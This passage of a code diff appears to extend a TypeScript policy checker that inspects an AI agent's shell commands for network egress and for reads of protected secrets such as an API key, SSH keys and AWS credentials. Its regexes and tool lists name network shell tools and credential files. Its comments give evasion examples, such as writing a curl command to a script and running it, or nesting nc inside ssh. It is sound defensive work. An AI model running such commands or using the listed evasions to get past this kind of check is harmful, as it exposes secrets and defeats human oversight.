@@ -1,3 +1,5 @@
+import { isIP } from "node:net";
+
 export interface PolicyViolation {
   rule: string;
   detail: string;
@@ -30,10 +32,6 @@ export interface PolicyContext {
   secretValues?: string[];
 }
 
-// Binaries whose whole purpose is moving bytes. Any use is potential egress.
-const ALWAYS_NETWORK =
-  /(^|[\s;&|("'`])(curl|wget|nc|ncat|netcat|telnet|ssh|scp|sftp|rsync|ftp|socat|openssl|aria2c|httpie|dig|nslookup|host|lwp-request|xh)(\s|$)/i;
-
 // Tools that reach the network only for particular subcommands. Treating all of
 // `git` or `npm` as egress would deny `git commit -m "see https://..."`, which
 // contacts nothing; matching the subcommand keeps `git push` and
@@ -55,132 +53,890 @@ const CONDITIONAL_NETWORK = [
 // printf builds the binary name rather than printing text.
 const TEXTUAL_URL_CONTEXT =
   /^\s*(?:\S*sh\s+-\S+\s+)?["']?\s*(echo|printf|git\s+(?:commit|tag))\b/i;
+// `echo 'curl http://x' > run.sh && bash run.sh` writes a command as text and
+// then runs it, so the textual carve-out must not apply. The script that runs
+// has to be the file that was written: matching any redirect followed by any
+// shell denied ordinary work such as writing a URL into notes.md and then
+// running an unrelated build script.
+function runsWrittenScript(command: string): boolean {
+  const written = new Set<string>();
+  for (const match of command.matchAll(/>>?\s*([^\s;&|<>]+)/g)) {
+    written.add(scriptIdentity(match[1]!));
+  }
+  if (written.size === 0) return false;
+
+  for (const segment of executableSegments(command)) {
+    const invocation = invocationFromSegment(segment, true);
+    if (!invocation) continue;
+    const { tool, args } = invocation;
+    // Executing the file directly, e.g. `./run.sh`.
+    if (written.has(scriptIdentity(tool))) return true;
+    if (!SHELL_NAMES.has(tool) && tool !== "source" && tool !== ".") continue;
+    for (const argument of args) {
+      if (argument.startsWith("-")) continue;
+      if (written.has(scriptIdentity(argument))) return true;
+    }
+  }
+  return false;
+}
+
+function scriptIdentity(token: string): string {
+  const unquoted = token.replace(/^['"]+/, "").replace(/['"]+$/, "");
+  return (unquoted.split("/").pop() ?? unquoted).toLowerCase();
+}
 
 // Any absolute URL, whatever binary (if any) is next to it.
 const ANY_URL = /\b[a-z][a-z0-9+.-]*:\/\/[^\s"'`)]+/i;
 
 function usesNetworkTool(command: string): boolean {
-  if (ALWAYS_NETWORK.test(command)) return true;
+  if (networkToolSegments(command).length > 0) return true;
   return CONDITIONAL_NETWORK.some((pattern) => pattern.test(command));
 }
 
 // Interpreters can reach the network without naming a network tool.
 const INLINE_NETWORK =
-  /(python3?\s+-c\b[\s\S]*\b(socket|urllib|requests|httpx|http\.client)\b)|(node\s+-e\b[\s\S]*\b(fetch|https?|net|axios)\b)|(perl\s+-e\b[\s\S]*\b(Socket|LWP)\b)|(\/dev\/(tcp|udp)\/)|(ruby\s+-e\b[\s\S]*\b(Net::HTTP|open-uri|Socket)\b)|(deno\s+(eval|run)\b)|(php\s+-r\b[\s\S]*\b(file_get_contents|curl_|fsockopen)\b)/i;
-
-// Material the Agent has no legitimate reason to read inside a workspace task.
-// Matches reading the value, not naming the identifier: `$ARK_API_KEY`,
-// `${ARK_API_KEY}`, `process.env.ARK_API_KEY`, `os.environ['ARK_API_KEY']`,
-// `$ENV{ARK_API_KEY}`, `getenv("ARK_API_KEY")`, `printenv ARK_API_KEY`.
-// Writing prose that mentions the variable is legitimate and must stay allowed.
-const ARK_KEY_DEREFERENCE =
-  /\$\{?!?ARK_API_KEY\}?|(?:process\.env|os\.environ|ENV)\s*(?:\.\s*ARK_API_KEY|\[\s*['"`]ARK_API_KEY|\{\s*['"`]?ARK_API_KEY)|(?:get|has)env\s*\(\s*['"`]ARK_API_KEY|(?:^|[\s;&|("'`])printenv\s+ARK_API_KEY\b/;
+  /(python3?\s+-c\b[\s\S]*\b(socket|urllib|requests|httpx|http\.client|getaddrinfo)\b)|(node\s+-e\b[\s\S]*\b(fetch|https?|net|dns|dgram|axios)\b)|(perl\s+-e\b[\s\S]*\b(Socket|LWP)\b)|(\/dev\/(tcp|udp)\/)|(ruby\s+-e\b[\s\S]*\b(Net::HTTP|open-uri|Socket)\b)|(deno\s+(eval|run)\b)|(php\s+-r\b[\s\S]*\b(file_get_contents|curl_|fsockopen)\b)/i;
 
 const PROTECTED_SECRETS = [
-  { pattern: ARK_KEY_DEREFERENCE, label: "Ark API key environment variable" },
   { pattern: /\.secrets?\b|\.sec\*/, label: "protected .secrets/ directory" },
   { pattern: /customer-db-url/, label: "protected credential fixture" },
-  { pattern: /\/proc\/self\/environ/, label: "process environment dump" },
+  { pattern: /\/proc\/(?:[^/\s]+\/)*environ\b/, label: "process environment dump" },
   { pattern: /\bid_rsa\b|\.ssh\/id_/, label: "SSH private key" },
   { pattern: /\.aws\/credentials/, label: "AWS credentials file" },
 ];
 
-// Weaker signals: legitimate on their own, exfiltration when paired with egress.
-// `set` is deliberately excluded — `set -euo pipefail` is ubiquitous in benign
-// shell invocations and made this rule fire on ordinary scripted commands.
-const ENV_DUMP = /(^|[\s;&|("'`])(printenv|env)(\s|$)/;
-
-// A whole-environment dump to stdout: `printenv` or `env` as a complete command
-// segment, with no variable argument and no downstream filter. Matches a bare
-// dump or one at the end of a `;`/`&` sequence, but NOT a pipe (`printenv | grep`
-// is filtered) nor a var-setting `env FOO=bar cmd` nor `printenv NODE_ENV`.
-const FULL_ENV_DUMP = /(^|[\s;&("'`])(printenv|env)\s*($|[;&"'`])/;
-
-// Dotted tokens that are filenames, not hosts. Without this, scanning a command
-// for bare hosts would read `index.d.ts` as a domain.
-const FILE_EXTENSIONS = new Set([
-  "ts", "tsx", "js", "jsx", "mjs", "cjs", "json", "md", "txt", "sh", "bash",
-  "zsh", "py", "rb", "go", "rs", "java", "c", "h", "cpp", "hpp", "css", "scss",
-  "html", "htm", "xml", "yml", "yaml", "toml", "lock", "gz", "tgz", "zip",
-  "tar", "log", "env", "sql", "csv", "png", "jpg", "jpeg", "svg",
-  "ico", "pdf", "backup", "bak", "tmp", "map", "d",
-  // NB: do not add "example" here — it would mask attacker.example hosts.
+// Network tools whose destination arguments can be inspected in command
+// position. This set drives argument-aware host extraction.
+const NETWORK_TOOL_NAMES = new Set([
+  "curl", "wget", "nc", "ncat", "netcat", "telnet", "ssh", "scp", "sftp",
+  "rsync", "ftp", "socat", "openssl", "aria2c", "httpie", "http", "xh",
+  "dig", "nslookup", "host", "ping", "ping6", "lwp-request",
 ]);
 
-// A bare dotted token is treated as a hostname unless it is a filename or a
-// code-identifier read (e.g. `process.platform`, `os.arch`). This catches any
-// real TLD — including uncommon ones like `.museum` — rather than an allowlist
-// that silently misses them. URLs are handled separately and unconditionally.
-const CODE_OBJECTS = new Set([
-  "process", "os", "path", "fs", "window", "document", "math", "json",
-  "console", "module", "exports", "require", "navigator", "location",
-  "globalthis", "self", "crypto", "util", "stream", "buffer", "events",
-  "child_process", "react", "vue",
-]);
-
-function isPlausibleHost(token: string): boolean {
-  const lower = token.toLowerCase();
-  if (/^\d{1,3}(?:\.\d{1,3}){3}$/.test(lower)) return true; // dotted IPv4
-  if (/^\d{7,10}$/.test(lower)) return true; // decimal / integer-form IPv4
-  if (looksLikeFilename(lower)) return false;
-  const labels = lower.split(".");
-  if (labels.length >= 2 && CODE_OBJECTS.has(labels[0]!)) return false;
-  const tld = labels.at(-1) ?? "";
-  return /^[a-z]{2,24}$/.test(tld); // any alphabetic TLD, not a file extension
+// Strip a `/bin/bash -lc '...'` / `sh -c "..."` wrapper to reach the real command
+// Codex ran. Everything below reasons about the inner command.
+function unwrapShell(command: string): string {
+  let inner = command;
+  for (let depth = 0; depth < 8; depth += 1) {
+    const match = inner.match(
+      /^\s*(?:\S*\/)?(?:ba|z|da)?sh\s+-\S*c\s+(['"])([\s\S]*)\1\s*$/i,
+    );
+    if (!match) break;
+    inner = match[2]!;
+  }
+  return inner;
 }
 
-function looksLikeFilename(token: string): boolean {
-  const extension = token.split(".").pop()?.toLowerCase() ?? "";
-  return FILE_EXTENSIONS.has(extension);
+// A command substitution runs its body as a command of its own, so `$(curl h)`
+// and `` `nc h 4444` `` must be analysed rather than read as an argument to
+// whatever encloses them. The body is lifted out for separate analysis and the
+// hole is filled with a token that can never parse as a host, so the enclosing
+// command keeps its shape without inventing a destination.
+const SUBSTITUTION_PLACEHOLDER = "$SUBSTITUTION";
+
+function splitSubstitutions(command: string): { outer: string; inner: string[] } {
+  const inner: string[] = [];
+  let outer = "";
+  let quote: "'" | '"' | null = null;
+  let escaped = false;
+  for (let index = 0; index < command.length; index += 1) {
+    const char = command[index]!;
+    if (escaped) {
+      outer += char;
+      escaped = false;
+      continue;
+    }
+    if (char === "\\" && quote !== "'") {
+      outer += char;
+      escaped = true;
+      continue;
+    }
+    if (char === "'" || char === '"') {
+      if (quote === char) quote = null;
+      else if (!quote) quote = char;
+      outer += char;
+      continue;
+    }
+    // Single quotes suppress substitution; double quotes do not.
+    if (quote === "'") {
+      outer += char;
+      continue;
+    }
+    const dollarParen = char === "$" && command[index + 1] === "(";
+    if (dollarParen || char === "`") {
+      const opened = dollarParen ? index + 1 : index;
+      const closed = dollarParen
+        ? matchingParen(command, opened)
+        : command.indexOf("`", opened + 1);
+      if (closed > opened) {
+        inner.push(command.slice(opened + 1, closed));
+        outer += SUBSTITUTION_PLACEHOLDER;
+        index = closed;
+        continue;
+      }
+    }
+    outer += char;
+  }
+  return { outer, inner };
+}
+
+function matchingParen(text: string, open: number): number {
+  let depth = 0;
+  for (let index = open; index < text.length; index += 1) {
+    if (text[index] === "(") depth += 1;
+    else if (text[index] === ")") {
+      depth -= 1;
+      if (depth === 0) return index;
+    }
+  }
+  return -1;
+}
+
+// Split on unquoted shell control operators. This is intentionally lightweight,
+// but unlike String.split it does not turn a `|` inside a quoted Node/Python
+// program into a fictitious command.
+function commandSegments(command: string): string[] {
+  const segments: string[] = [];
+  let current = "";
+  let quote: "'" | '"' | null = null;
+  let escaped = false;
+  for (let index = 0; index < command.length; index += 1) {
+    const char = command[index]!;
+    if (escaped) {
+      current += char;
+      escaped = false;
+      continue;
+    }
+    if (char === "\\" && quote !== "'") {
+      current += char;
+      escaped = true;
+      continue;
+    }
+    if (char === "'" || char === '"') {
+      if (quote === char) quote = null;
+      else if (!quote) quote = char;
+      current += char;
+      continue;
+    }
+    if (!quote && (char === ";" || char === "|" || char === "&" || char === "\n")) {
+      if (current.trim()) segments.push(current.trim());
+      current = "";
+      if ((char === "|" || char === "&") && command[index + 1] === char) index += 1;
+      continue;
+    }
+    current += char;
+  }
+  if (current.trim()) segments.push(current.trim());
+  return segments;
+}
+
+function baseName(token: string): string {
+  const structural = token
+    .replace(/^\$?\(+/, "")
+    .replace(/^[!{]+/, "")
+    .replace(/[)}]+$/, "");
+  return (structural.split("/").pop() ?? structural).toLowerCase();
+}
+
+/** Tokenize one already-isolated command segment, removing shell quotes. */
+function shellWords(segment: string): string[] {
+  const words: string[] = [];
+  let current = "";
+  let quote: "'" | '"' | null = null;
+  let escaped = false;
+  const flush = () => {
+    if (current) words.push(current);
+    current = "";
+  };
+  for (const char of segment) {
+    if (escaped) {
+      current += char;
+      escaped = false;
+      continue;
+    }
+    if (char === "\\" && quote !== "'") {
+      escaped = true;
+      continue;
+    }
+    if (char === "'" || char === '"') {
+      if (quote === char) quote = null;
+      else if (!quote) quote = char;
+      else current += char;
+      continue;
+    }
+    if (!quote && /\s/.test(char)) {
+      flush();
+      continue;
+    }
+    current += char;
+  }
+  if (escaped) current += "\\";
+  flush();
+  return words;
+}
+
+const ASSIGNMENT = /^[A-Za-z_][A-Za-z0-9_]*=/;
+const SIMPLE_WRAPPERS = new Set(["exec", "nohup"]);
+const SHELL_PREFIXES = new Set(["then", "do", "else", "elif", "time", "builtin"]);
+const SUDO_VALUE_OPTIONS = new Set(["-u", "--user", "-g", "--group", "-h", "--host", "-p", "--prompt", "-C", "--chdir"]);
+
+/**
+ * Resolve the command actually invoked after assignments and common wrappers.
+ * `unwrapEnv` lets network parsing see `env FOO=bar curl ...`, while environment
+ * policy can inspect `env` itself.
+ */
+function invocationFromSegment(
+  segment: string,
+  unwrapEnv: boolean,
+): { tool: string; args: string[] } | null {
+  const words = shellWords(segment);
+  let index = 0;
+  while (ASSIGNMENT.test(words[index] ?? "")) index += 1;
+
+  while (index < words.length) {
+    const tool = baseName(words[index]!);
+    if (SHELL_PREFIXES.has(tool)) {
+      index += 1;
+      if (tool === "time") {
+        while (words[index]?.startsWith("-")) index += 1;
+      }
+      continue;
+    }
+    if (tool === "command") {
+      // `command -v env` / `command -V env` inspect a name; they do not invoke
+      // it. Plain `command env` and `command -- env` are execution wrappers.
+      if (words[index + 1] === "-v" || words[index + 1] === "-V") {
+        return { tool, args: words.slice(index + 1) };
+      }
+      index += 1;
+      if (words[index] === "--") index += 1;
+      continue;
+    }
+    if (SIMPLE_WRAPPERS.has(tool)) {
+      index += 1;
+      while (words[index]?.startsWith("-") && words[index] !== "--") index += 1;
+      if (words[index] === "--") index += 1;
+      continue;
+    }
+    if (tool === "sudo") {
+      index += 1;
+      while (index < words.length && words[index]!.startsWith("-")) {
+        const option = words[index]!;
+        index += 1;
+        if (!option.includes("=") && SUDO_VALUE_OPTIONS.has(option)) index += 1;
+      }
+      continue;
+    }
+    if (tool === "timeout") {
+      index += 1;
+      while (words[index]?.startsWith("-")) index += 1;
+      if (index < words.length) index += 1; // duration
+      continue;
+    }
+    if (tool === "busybox") {
+      index += 1;
+      continue;
+    }
+    if (tool === "env" && unwrapEnv) {
+      index += 1;
+      while (index < words.length) {
+        const word = words[index]!;
+        if (word === "--") {
+          index += 1;
+          break;
+        }
+        if (word === "-S" || word === "--split-string") {
+          const split = shellWords(words[index + 1] ?? "");
+          words.splice(index, 2, ...split);
+          continue;
+        }
+        if (word.startsWith("--split-string=")) {
+          const split = shellWords(word.slice("--split-string=".length));
+          words.splice(index, 1, ...split);
+          continue;
+        }
+        if (word === "-u" || word === "--unset" || word === "-C" || word === "--chdir") {
+          index += 2;
+          continue;
+        }
+        if (word.startsWith("-") || ASSIGNMENT.test(word)) {
+          index += 1;
+          continue;
+        }
+        break;
+      }
+      continue;
+    }
+    return { tool, args: words.slice(index + 1) };
+  }
+  return null;
+}
+
+const SHELL_NAMES = new Set(["sh", "bash", "zsh", "dash", "ksh"]);
+const FIND_EXEC_OPTIONS = new Set(["-exec", "-execdir", "-ok", "-okdir"]);
+// Tools that take a destination and then a command to run at that destination.
+const REMOTE_COMMAND_TOOLS = new Set(["ssh"]);
+// Tools whose first host-shaped positional is the destination; anything after
+// it is a remote command or a port, not a second hop.
+const ONE_DESTINATION_TOOLS = new Set([
+  "ssh", "sftp", "telnet", "ftp", "ping", "ping6", "nc", "ncat",
+  "netcat", "dig", "nslookup", "host",
+]);
+
+/**
+ * Commands carried as *arguments* to another command, which still execute.
+ * Without this, only the leading binary of a segment is ever resolved, so
+ * `find . -exec curl h \;` and `ssh host nc h 4444` name no network tool.
+ */
+function nestedCommands(segment: string): string[] {
+  const invocation = invocationFromSegment(segment, true);
+  if (!invocation) return [];
+  const { tool, args } = invocation;
+
+  // `sh -c '...'` anywhere, not just as the whole command.
+  if (SHELL_NAMES.has(tool)) {
+    for (let index = 0; index < args.length; index += 1) {
+      const argument = args[index]!;
+      if (argument.startsWith("-") && /c/.test(argument.slice(1)) && args[index + 1]) {
+        return [args[index + 1]!];
+      }
+    }
+    return [];
+  }
+
+  if (tool === "find") {
+    const nested: string[] = [];
+    for (let index = 0; index < args.length; index += 1) {
+      if (!FIND_EXEC_OPTIONS.has(args[index]!)) continue;
+      const body: string[] = [];
+      index += 1;
+      while (index < args.length && args[index] !== ";" && args[index] !== "+") {
+        body.push(args[index]!);
+        index += 1;
+      }
+      if (body.length > 0) nested.push(body.join(" "));
+    }
+    return nested;
+  }
+
+  if (tool === "xargs") {
+    const valueOptions = new Set(["-I", "-i", "-L", "-n", "-P", "-s", "-d", "-E", "-a", "--replace", "--max-args", "--max-procs", "--delimiter", "--arg-file"]);
+    let index = 0;
+    while (index < args.length) {
+      const argument = args[index]!;
+      if (!argument.startsWith("-")) break;
+      if (argument.includes("=")) {
+        index += 1;
+        continue;
+      }
+      index += 1;
+      if (valueOptions.has(argument)) index += 1;
+    }
+    const body = args.slice(index).join(" ");
+    return body ? [body] : [];
+  }
+
+  // `ssh host <remote command>` runs the tail on the far side; its own
+  // destinations matter just as much as the hop it travels through.
+  if (REMOTE_COMMAND_TOOLS.has(tool)) {
+    const positionals = positionalArgs(tool, args);
+    const destination = positionals.findIndex(
+      (argument) => hostFromToken(argument) !== null,
+    );
+    const remote = destination < 0 ? [] : positionals.slice(destination + 1);
+    return remote.length > 0 ? [remote.join(" ")] : [];
+  }
+
+  return [];
+}
+
+/**
+ * Every command that would actually run, including those nested inside command
+ * substitution, `sh -c` bodies, and exec-style wrappers.
+ */
+function executableSegments(command: string, depth = 0): string[] {
+  if (depth > 6) return [];
+  const { outer, inner } = splitSubstitutions(command);
+  const segments: string[] = [];
+  for (const segment of commandSegments(outer)) {
+    segments.push(segment);
+    for (const nested of nestedCommands(segment)) {
+      segments.push(...executableSegments(nested, depth + 1));
+    }
+  }
+  for (const body of inner) {
+    segments.push(...executableSegments(body, depth + 1));
+  }
+  return segments;
+}
+
+// Extract a destination from an argument that is already known to occupy a
+// network-tool destination position. Context is the important part here:
+// `curl react.dev`, `curl evil`, and `ssh user@process.com` are destinations,
+// while the same strings in `echo` or a commit message are just text.
+function hostFromToken(token: string): string | null {
+  let t = token
+    .replace(/^['"`(]+/, "")
+    .replace(/['"`),;}]+$/, "");
+  if (/^[a-z][a-z0-9+.-]*:\/\//i.test(t)) {
+    try {
+      return new URL(t).hostname.replace(/^\[|\]$/g, "").toLowerCase();
+    } catch {
+      t = t.replace(/^[a-z][a-z0-9+.-]*:\/\//i, "");
+    }
+  }
+  t = t.replace(/^.*@/, "");
+  const v6 = t.match(/^\[([^\]]+)\]/);
+  if (v6 && isIP(v6[1]!.replace(/%.+$/, "")) === 6) {
+    return v6[1]!.toLowerCase();
+  }
+  t = t.split("/")[0]!;
+  if (isIP(t.replace(/%.+$/, ""))) return t.toLowerCase();
+
+  // A single colon is a URL port or scp path separator. Multiple colons are a
+  // raw IPv6 literal and were handled above.
+  if ((t.match(/:/g) ?? []).length === 1) t = t.slice(0, t.indexOf(":"));
+  if (!t || !/^[a-z0-9.-]+$/i.test(t)) return null;
+
+  // WHATWG URL parsing canonicalises decimal/octal/hex and shortened IPv4,
+  // closing forms such as 2130706433 and 127.1 without hand-rolled arithmetic.
+  try {
+    const canonical = new URL("http://" + t).hostname.toLowerCase();
+    if (canonical && /^[a-z0-9.-]+$/i.test(canonical)) {
+      // Non-canonical numeric spellings are useful SSRF/allowlist evasions.
+      // Report the literal rather than silently turning 2130706433 into the
+      // allowlisted 127.0.0.1.
+      if (/^(?:\d|0x)/i.test(t) && canonical !== t.toLowerCase()) {
+        return t.toLowerCase();
+      }
+      return canonical;
+    }
+  } catch {
+    // Fall through to null for malformed labels.
+  }
+  return null;
+}
+
+function hasShellArkDereference(command: string): boolean {
+  let quote: "'" | '"' | null = null;
+  let escaped = false;
+  for (let index = 0; index < command.length; index += 1) {
+    const char = command[index]!;
+    if (escaped) {
+      escaped = false;
+      continue;
+    }
+    if (char === "\\" && quote !== "'") {
+      escaped = true;
+      continue;
+    }
+    if (char === "'" || char === '"') {
+      if (quote === char) quote = null;
+      else if (!quote) quote = char;
+      continue;
+    }
+    if (char !== "$" || quote === "'") continue;
+    const rest = command.slice(index);
+    if (/^\$ARK_API_KEY\b/.test(rest) || /^\$\{!?ARK_API_KEY(?::?[-+?=][^}]*)?\}/.test(rest)) {
+      return true;
+    }
+  }
+  return false;
+}
+
+const RUNTIME_TOOLS = new Set(["node", "deno", "python", "python3", "perl", "ruby", "php"]);
+const RUNTIME_ARK_ACCESS =
+  /(?:process\.env|Deno\.env)(?:\[['"]ARK_API_KEY['"]\]|\.ARK_API_KEY)|os\.(?:environ(?:\[['"]ARK_API_KEY['"]\]|\.get\(['"]ARK_API_KEY['"]\))|getenv\(['"]ARK_API_KEY['"]\))|ENV\[['"]ARK_API_KEY['"]\]|getenv\(['"]ARK_API_KEY['"]\)/i;
+
+// Spellings of the protected variable that a filter argument may carry. An
+// exact-match check let the same request through as `grep ARK_API`, while the
+// corpus treats `grep ARK` and `grep ARK_API_KEY` as attacks.
+const ARK_FILTER_TOKEN = /^\^?ARK(?:_?API(?:_?KEY)?)?\$?$/i;
+
+function hasNamedArkAccess(command: string): boolean {
+  const inner = unwrapShell(command);
+  if (hasShellArkDereference(inner)) return true;
+  const segments = executableSegments(command);
+  if (segments.some((segment) => hasShellArkDereference(segment))) return true;
+  let fullEnvironmentSeen = false;
+  for (const segment of segments) {
+    const rawInvocation = invocationFromSegment(segment, false);
+    const invocation = invocationFromSegment(segment, true);
+    if (
+      (rawInvocation?.tool === "printenv" && rawInvocation.args.length === 0) ||
+      (rawInvocation?.tool === "env" && rawInvocation.args.length === 0)
+    ) {
+      fullEnvironmentSeen = true;
+    }
+    if (!invocation) continue;
+    if (
+      invocation.tool === "printenv" &&
+      invocation.args.some((argument) => argument === "ARK_API_KEY")
+    ) {
+      return true;
+    }
+    if (RUNTIME_TOOLS.has(invocation.tool) && RUNTIME_ARK_ACCESS.test(segment)) {
+      return true;
+    }
+    if (
+      fullEnvironmentSeen &&
+      shellWords(segment).some((argument) => ARK_FILTER_TOKEN.test(argument))
+    ) {
+      return true;
+    }
+  }
+  return false;
 }
 
 function findProtectedSecret(command: string): string | null {
+  if (hasNamedArkAccess(command)) return "Ark API key";
   for (const secret of PROTECTED_SECRETS) {
     if (secret.pattern.test(command)) return secret.label;
   }
   return null;
 }
 
+// Invocations whose resolved leading binary is a recognised network tool.
+function networkToolInvocations(command: string): { tool: string; args: string[] }[] {
+  return executableSegments(command)
+    .map((segment) => invocationFromSegment(segment, true))
+    .filter(
+      (invocation): invocation is { tool: string; args: string[] } =>
+        invocation !== null && NETWORK_TOOL_NAMES.has(invocation.tool),
+    );
+}
+
+function networkToolSegments(command: string): string[] {
+  return networkToolInvocations(command).map(
+    (invocation) => invocation.tool + " " + invocation.args.join(" "),
+  );
+}
+
+const TOOL_VALUE_OPTIONS: Record<string, ReadonlySet<string>> = {
+  curl: new Set([
+    "-o", "--output", "-d", "--data", "--data-ascii", "--data-binary",
+    "--data-raw", "--data-urlencode", "-H", "--header", "-A",
+    "--user-agent", "-e", "--referer", "-F", "--form", "-T",
+    "--upload-file", "-u", "--user", "-x", "--proxy", "--preproxy",
+    "--url", "-X", "--request", "-w", "--write-out", "--cacert",
+    "--capath", "--cert", "--key", "--resolve", "--connect-to",
+    "--unix-socket", "--max-time", "--connect-timeout", "--retry",
+    "--retry-delay", "--limit-rate", "-b", "--cookie", "-c",
+    "--cookie-jar", "-K", "--config", "--netrc-file", "--trace",
+    "--trace-ascii", "-D", "--dump-header", "--output-dir",
+  ]),
+  wget: new Set([
+    "-O", "--output-document", "-o", "--output-file", "-P",
+    "--directory-prefix", "--header", "--post-data", "--post-file",
+    "--user-agent", "--referer", "--timeout", "--tries", "--wait",
+    "--quota", "--bind-address", "--ca-certificate", "--certificate",
+    "--private-key", "-e", "--execute", "-i", "--input-file",
+  ]),
+  aria2c: new Set([
+    "-o", "--out", "-d", "--dir", "--header", "--user-agent",
+    "--referer", "--timeout", "--connect-timeout", "--load-cookies",
+    "--save-cookies", "--all-proxy", "--http-proxy", "--https-proxy",
+    "--ftp-proxy",
+  ]),
+  ssh: new Set([
+    "-b", "-c", "-D", "-E", "-F", "-i", "-J", "-L", "-l", "-m",
+    "-O", "-o", "-p", "-Q", "-R", "-S", "-W", "-w",
+  ]),
+  sftp: new Set([
+    "-B", "-b", "-c", "-D", "-F", "-i", "-J", "-l", "-o", "-P",
+    "-R", "-S",
+  ]),
+  scp: new Set([
+    "-c", "-D", "-F", "-i", "-J", "-l", "-o", "-P", "-S", "-X",
+  ]),
+  rsync: new Set(["-e", "--rsh", "--rsync-path", "--password-file"]),
+  ping: new Set([
+    "-c", "-i", "-I", "-l", "-M", "-m", "-p", "-Q", "-s", "-t",
+    "-W", "-w",
+  ]),
+  ping6: new Set([
+    "-c", "-i", "-I", "-l", "-M", "-m", "-p", "-Q", "-s", "-t",
+    "-W", "-w",
+  ]),
+  nc: new Set(["-e", "-i", "-p", "-q", "-s", "-w", "-x", "-X"]),
+  ncat: new Set([
+    "-e", "--exec", "-i", "--idle-timeout", "-p", "--source-port",
+    "-s", "--source", "-w", "--wait", "--proxy", "--proxy-type",
+  ]),
+  netcat: new Set(["-e", "-i", "-p", "-q", "-s", "-w", "-x", "-X"]),
+};
+
+const TOOL_HOST_OPTIONS: Record<string, ReadonlySet<string>> = {
+  curl: new Set(["-x", "--proxy", "--preproxy", "--url"]),
+  aria2c: new Set([
+    "--all-proxy", "--http-proxy", "--https-proxy", "--ftp-proxy",
+  ]),
+  ssh: new Set(["-J", "-W"]),
+  sftp: new Set(["-J"]),
+  scp: new Set(["-J"]),
+  nc: new Set(["-x"]),
+  ncat: new Set(["--proxy"]),
+  netcat: new Set(["-x"]),
+};
+
+function hostOptionValues(tool: string, args: string[]): string[] {
+  const values: string[] = [];
+  const options = TOOL_HOST_OPTIONS[tool] ?? new Set<string>();
+  for (let index = 0; index < args.length; index += 1) {
+    const argument = args[index]!;
+    if (argument.startsWith("--") && argument.includes("=")) {
+      const separator = argument.indexOf("=");
+      if (options.has(argument.slice(0, separator))) {
+        values.push(...argument.slice(separator + 1).split(","));
+      }
+      continue;
+    }
+    if (options.has(argument)) {
+      if (args[index + 1]) values.push(...args[index + 1]!.split(","));
+      index += 1;
+      continue;
+    }
+    const shortOption = argument.slice(0, 2);
+    if (argument.length > 2 && options.has(shortOption)) {
+      values.push(...argument.slice(2).split(","));
+    }
+  }
+  return values;
+}
+
+function optionValues(args: string[], names: ReadonlySet<string>): string[] {
+  const values: string[] = [];
+  for (let index = 0; index < args.length; index += 1) {
+    const argument = args[index]!;
+    const equals = argument.indexOf("=");
+    if (equals > 0 && names.has(argument.slice(0, equals))) {
+      values.push(argument.slice(equals + 1));
+    } else if (names.has(argument) && args[index + 1]) {
+      values.push(args[index + 1]!);
+      index += 1;
+    } else if (argument.length > 2 && names.has(argument.slice(0, 2))) {
+      values.push(argument.slice(2));
+    }
+  }
+  return values;
+}
+
+function colonFields(value: string): string[] {
+  const fields: string[] = [];
+  let current = "";
+  let bracketed = false;
+  for (const char of value) {
+    if (char === "[") bracketed = true;
+    if (char === "]") bracketed = false;
+    if (char === ":" && !bracketed) {
+      fields.push(current);
+      current = "";
+    } else {
+      current += char;
+    }
+  }
+  fields.push(current);
+  return fields;
+}
+
+function curlOverrideHosts(args: string[]): string[] {
+  const hosts: string[] = [];
+  for (const value of optionValues(args, new Set(["--resolve"]))) {
+    const fields = colonFields(value);
+    for (const address of fields.slice(2).join(":").split(",")) {
+      const host = hostFromToken(address);
+      if (host) hosts.push(host);
+    }
+  }
+  for (const value of optionValues(args, new Set(["--connect-to"]))) {
+    const fields = colonFields(value);
+    const host = hostFromToken(fields[2] ?? "");
+    if (host) hosts.push(host);
+  }
+  return hosts;
+}
+
+function sshRoutingHosts(args: string[]): string[] {
+  const hosts: string[] = [];
+  for (const value of optionValues(args, new Set(["-L", "-R", "-W"]))) {
+    const fields = colonFields(value);
+    const candidate = fields.length >= 2 ? fields[fields.length - 2]! : fields[0]!;
+    const host = hostFromToken(candidate);
+    if (host) hosts.push(host);
+  }
+  for (const value of optionValues(args, new Set(["-o"]))) {
+    const separator = value.indexOf("=");
+    if (separator < 0) continue;
+    const key = value.slice(0, separator).toLowerCase();
+    const optionValue = value.slice(separator + 1);
+    if (key === "proxyjump") {
+      for (const jump of optionValue.split(",")) {
+        const host = hostFromToken(jump);
+        if (host) hosts.push(host);
+      }
+    } else if (key === "proxycommand") {
+      const proxy = invocationFromSegment(optionValue, true);
+      if (proxy && NETWORK_TOOL_NAMES.has(proxy.tool)) {
+        hosts.push(...hostsFromNetworkInvocation(proxy.tool, proxy.args));
+      }
+    }
+  }
+  for (const argument of args) {
+    const match = argument.match(/^-o(?:ProxyJump|ProxyCommand)=(.+)$/i);
+    if (!match) continue;
+    const synthetic = sshRoutingHosts(["-o", argument.slice(2)]);
+    hosts.push(...synthetic);
+  }
+  return hosts;
+}
+
+/**
+ * Whether a short-option token consumes the argument that follows it.
+ *
+ * Short options bundle: in `curl -sX POST`, the value-taking option is the last
+ * letter of the bundle, so `POST` is `-X`'s value and not a destination.
+ * Checking only two-character tokens made every such bundle leak its value into
+ * destination position, where `POST` canonicalises to the host `post`.
+ * A value attached inside the bundle (`wget -qO-`) consumes nothing further.
+ */
+function shortBundleTakesNextArgument(
+  argument: string,
+  valueOptions: ReadonlySet<string>,
+): boolean {
+  for (let position = 1; position < argument.length; position += 1) {
+    if (!valueOptions.has("-" + argument[position]!)) continue;
+    return position === argument.length - 1;
+  }
+  return false;
+}
+
+function positionalArgs(tool: string, args: string[]): string[] {
+  const positions: string[] = [];
+  const valueOptions = TOOL_VALUE_OPTIONS[tool] ?? new Set<string>();
+  for (let index = 0; index < args.length; index += 1) {
+    const argument = args[index]!;
+    if (argument === "--") {
+      positions.push(...args.slice(index + 1));
+      break;
+    }
+    if (argument.startsWith("--")) {
+      if (!argument.includes("=") && valueOptions.has(argument)) index += 1;
+      continue;
+    }
+    if (argument.startsWith("-")) {
+      if (shortBundleTakesNextArgument(argument, valueOptions)) index += 1;
+      continue;
+    }
+    positions.push(argument);
+  }
+  return positions;
+}
+
+function hostsFromNetworkInvocation(tool: string, args: string[]): string[] {
+  if (tool === "scp" || tool === "rsync") {
+    const remoteHosts = positionalArgs(tool, args)
+      .filter((argument) => argument.includes(":") || argument.includes("@"))
+      .map(hostFromToken)
